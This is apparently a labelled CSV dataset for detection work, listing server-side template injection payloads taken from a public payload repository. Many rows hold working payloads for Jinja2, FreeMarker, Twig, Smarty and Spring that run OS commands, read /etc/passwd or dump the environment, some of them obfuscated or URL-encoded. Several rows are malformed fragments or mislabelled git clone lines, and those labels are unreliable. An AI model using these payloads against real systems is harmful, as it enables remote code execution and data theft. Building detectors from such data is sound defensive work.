{{ request }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{self}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""id"")}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"${""freemarker.template.utility.Execute""?new()(""id"")}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{$smarty.version},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{php}echo `id`;{/php},CMDi_Unix,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{['id']|filter('system')}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"{{request|attr(""__class__"")}}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{request.__class__}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())},CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
${T(java.lang.System).getenv()},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')},CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())},SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{2*2}}[[3*3]],SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{3*3}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{3*'3'}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
<%= 3 * 3 %>,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
${6*6},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
${{3*3}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
@(6+5),SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
#{3*3},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
#{ 3 * 3 },SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{dump(app)}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{config.items()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{ [].class.base.subclasses() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{''.class.mro()[1].subclasses()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{ ''.__class__.__mro__[2].__subclasses__() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{'a'.toUpperCase()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{ request }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{self}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""id"")}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"${""freemarker.template.utility.Execute""?new()(""id"")}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{$smarty.version},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{php}echo `id`;{/php},CMDi_Unix,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{['id']|filter('system')}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"{{request|attr(""__class__"")}}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{request.__class__}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
${T(java.lang.System).getenv()},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')},CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())},SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
root@ismailtasdelen:~# git clone https://github.com/payloadbox/ssti-payloads.git,SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
root@ismailtasdelen:~# git clone git@github.com:payloadbox/ssti-payloads.git,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"{php}echo """,CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
",CMDi_Unix,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{2*2}}[[3*3]],SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{3*3}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{3*'3'}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
<%= 3 * 3 %>,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
${6*6},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
${{3*3}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
@(6+5),SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
#{3*3},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
#{ 3 * 3 },SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{dump(app)}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{config.items()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{ [].class.base.subclasses() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{''.class.mro()[1].subclasses()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{ ''.__class__.__mro__[2].__subclasses__() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{'a'.toUpperCase()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{ request }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{self}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
<#assign ex = """"freemarker.template.utility.Execute""""?new()>${ ex(""""id"""")}""",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
"${""freemarker.template.utility.Execute""?new()(""id"")}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{$smarty.version},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{php}echo `id`;{/php},CMDi_Unix,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{['id']|filter('system')}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
"{{request|attr(""__class__"")}}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{request.__class__}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
${T(java.lang.System).getenv()},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')},CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())},SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
root@ismailtasdelen:~# git clone https://github.com/payloadbox/ssti-payloads.git,SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
root@ismailtasdelen:~# git clone git@github.com:payloadbox/ssti-payloads.git,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
"{php}echo """,CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
",CMDi_Unix,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{2*2}}[[3*3]],SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{3*3}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{3*'3'}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
<%= 3 * 3 %>,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
${6*6},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
${{3*3}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
@(6+5),SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
#{3*3},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
#{ 3 * 3 },SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
*{7*7},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{dump(app)}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{config.items()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{ [].class.base.subclasses() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{''.class.mro()[1].subclasses()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{ ''.__class__.__mro__[2].__subclasses__() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{'a'.toUpperCase()}} ,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{ request }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{self}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
<#assign ex = """"freemarker.template.utility.Execute""""?new()>${ ex(""""id"""")}""",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
"${""freemarker.template.utility.Execute""?new()(""id"")}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{$smarty.version},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{php}echo `id`;{/php},CMDi_Unix,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{['id']|filter('system')}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
"{{request|attr(""__class__"")}}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{request.__class__}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())},CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
${T(java.lang.System).getenv()},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')},CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())},SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B2%2A2%7D%7D%5B%5B3%2A3%5D%5D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B3%2A3%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B3%2A%273%27%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%3C%25%3D%203%20%2A%203%20%25%3E%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%24%7B6%2A6%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%24%7B%7B3%2A3%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%40%286%2B5%29%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%23%7B3%2A3%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%23%7B%203%20%2A%203%20%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7Bdump%28app%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7Bapp.request.server.all%7Cjoin%28%27%2C%27%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7Bconfig.items%28%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B%20%5B%5D.class.base.subclasses%28%29%20%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B%27%27.class.mro%28%29%5B1%5D.subclasses%28%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B%20%27%27.__class__.__mro__%5B2%5D.__subclasses__%28%29%20%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B%27%27%2E%5F%5Fclass%5F%5F%2E%5F%5Fbase%5F%5F%2E%5F%5Fsubclasses%5F%5F%28%29%5B227%5D%28%27cat%20%2Fetc%2Fpasswd%27%2C%20shell%3DTrue%2C%20stdout%3D%2D1%29%2Ecommunicate%28%29%7D%7D,SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%25%20for%20key%2C%20value%20in%20config.iteritems%28%29%20%25%7D%3Cdt%3E%7B%7B%20key%7Ce%20%7D%7D%3C/dt%3E%3Cdd%3E%7B%7B%20value%7Ce%20%7D%7D%3C/dd%3E%7B%25%20endfor%20%25%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B%27a%27.toUpperCase%28%29%7D%7D%20%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B%20request%20%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7Bself%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
